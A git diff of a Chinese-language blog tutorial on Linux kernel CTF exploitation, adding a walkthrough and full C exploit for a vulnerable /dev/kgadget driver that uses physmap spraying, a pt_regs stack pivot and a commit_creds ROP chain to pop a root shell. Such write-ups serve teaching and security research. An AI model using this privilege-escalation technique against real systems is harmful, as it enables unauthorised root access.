@@ -5,7 +5,7 @@ tags:
   - Kernel
   - tutorial
 date: 2024-03-18 19:02:34
-draft: true
+draft: false
 title: "Kernel - How2Kernel 0x01: ROP and pt-regs"
 ---
 
@@ -711,3 +711,132 @@ MAX_MEMORY_SIZE` 的内存直接对应了整个物理地址空间。
 3. 基于泄漏得到的处于 Direct Mapping Area 的堆地址进行内存搜索，就可以稳定拿到用户态喷射的内存；
 
 在大部分情况下并没有内存搜索的能力，这时候就可以采用 `Physmap Spray` 的手段布置大量同样的 payload，后随机选取一块合适的位于 Direct Mapping Area 的地址以求命中。
+
+回到题目上，可以先验证上述喷射思路，先 mmap 大量内存并填满标记，到调试器中从 `0xffff888000000000 ~ 0xffffc87fffffffff` 的直接映射区中找到用户态喷射的内存映射，代码如下：
+
+```c
+#include "libLian.h"
+#define SPRAY_NUM 0x4000
+#define PAGE_SIZE 0x1000
+
+extern size_t user_cs, user_ss, user_rflags, user_sp;
+
+int fd;
+size_t *physmap_spray_arr[SPRAY_NUM];
+
+int main() {
+    save_status();
+    fd = open("/dev/kgadget", 2);
+
+    physmap_spray_arr[0] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    memset(physmap_spray_arr[0], 0xef, PAGE_SIZE);
+
+    for (int i = 1; i < SPRAY_NUM; i++) {
+        physmap_spray_arr[i] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        memcpy(physmap_spray_arr[i], physmap_spray_arr[0], PAGE_SIZE);
+    }
+
+    __asm__("mov r9, 0x88888888;"
+            "mov r8, 0x99999999;");
+
+    ioctl(fd, 114514, 0xffff888000000000 + SPRAY_NUM * PAGE_SIZE * 2);
+    return 0;
+}
+```
+
+调试时按照 `SPRAY_NUM * PAGE_SIZE` 的步长依次查看直接映射区的数据，发现上面的地址是可行的。
+
+---
+
+现在这道题只剩最后一个问题，该布置什么样的 ROP 链才能稳定实现利用？毕竟目前只能执行一次 `call rbp`，内核中也不存在提权 `one_gadget`。
+
+可以考虑如下构造：
+
+1. R8、R9 布置好栈迁移的链子，即 `R8 = &(pop rsp ; ret)`，`R9 = 0xffff888000000000 + SPRAY_NUM * PAGE_SIZE * 2`；
+2. 喷射的 payload 中，必然要包含大量 `add rsp 0xC0 ; ret` 的 gadget，其中 0xC0 来源于调试找到栈上 `pt_regs` 中 R8 的偏移；
+3. 光栈迁移还不够，最后还是要写提权的 ROP 链；
+4. 但是若命中了 `add rsp 0xC0 ; ret`，也不能确保最终控制流会落在提权 ROP 的开始处，就需要往里面塞 0xC0 字节的 `ret` 来确保利用稳定。
+
+于是就构造出如下 payload：
+
+```c
+// author: @eastXueLian
+// usage : eval $buildPhase
+// You can refer to my nix configuration for detailed information.
+
+#include "libLian.h"
+#define SPRAY_NUM 0x4000
+#define PAGE_SIZE 0x1000
+
+extern size_t user_cs, user_ss, user_rflags, user_sp;
+
+int fd;
+size_t *physmap_spray_arr[SPRAY_NUM];
+size_t add_rsp_0xc0 = 0xffffffff810737fe;
+size_t pop_rsp_ret = 0xffffffff811483d0;
+size_t pop_rdi_ret = 0xffffffff8108c6f0;
+size_t init_cred = 0xffffffff82a6b700;
+size_t commit_creds = 0xffffffff810c92e0;
+size_t swapgs_pop_ret = 0xffffffff81bb99af;
+size_t iretq = 0xffffffff81c01067;
+
+size_t try_hit = 0xffff888000000000 + SPRAY_NUM * PAGE_SIZE * 2;
+
+void segfault_handler(int sig) {
+    success("Returning root shell:");
+    get_shell();
+    exit(0);
+}
+
+int main() {
+    save_status();
+    signal(SIGSEGV, segfault_handler);
+    int i;
+
+    fd = open("/dev/kgadget", 2);
+
+    physmap_spray_arr[0] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    for (i = 0; i < (PAGE_SIZE / sizeof(size_t)) - (0xc0 / sizeof(size_t)) - 11;
+         i++) {
+        physmap_spray_arr[0][i] = add_rsp_0xc0;
+    }
+    for (int j = 0; j < 0xc0 / sizeof(size_t); j++) {
+        physmap_spray_arr[0][i++] = pop_rdi_ret + 1;
+    }
+
+    physmap_spray_arr[0][i++] = pop_rdi_ret;
+    physmap_spray_arr[0][i++] = init_cred;
+    physmap_spray_arr[0][i++] = commit_creds;
+    physmap_spray_arr[0][i++] = swapgs_pop_ret;
+    physmap_spray_arr[0][i++] = 0;
+    physmap_spray_arr[0][i++] = iretq;
+    physmap_spray_arr[0][i++] = (size_t)get_shell;
+    physmap_spray_arr[0][i++] = user_cs;
+    physmap_spray_arr[0][i++] = user_rflags;
+    physmap_spray_arr[0][i++] = user_sp;
+    physmap_spray_arr[0][i++] = user_ss;
+
+    for (int i = 1; i < SPRAY_NUM; i++) {
+        physmap_spray_arr[i] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        memcpy(physmap_spray_arr[i], physmap_spray_arr[0], PAGE_SIZE);
+    }
+
+    __asm__("mov r9, pop_rsp_ret;"
+            "mov r8, try_hit;");
+
+    ioctl(fd, 114514, try_hit);
+    return 0;
+}
+```
+
+---
+
+# References
+
+1. [PWN.0x00 Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/) . *[arttnba3](https://arttnba3.cn/)*
+2. [系列 - Digging Into Kernel](https://blog.wingszeng.top/series/digging-into-kernel/) . *[wings](https://blog.wingszeng.top/)*
+3. [index : kernel/git/torvalds/linux.git](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14) . *Linux*
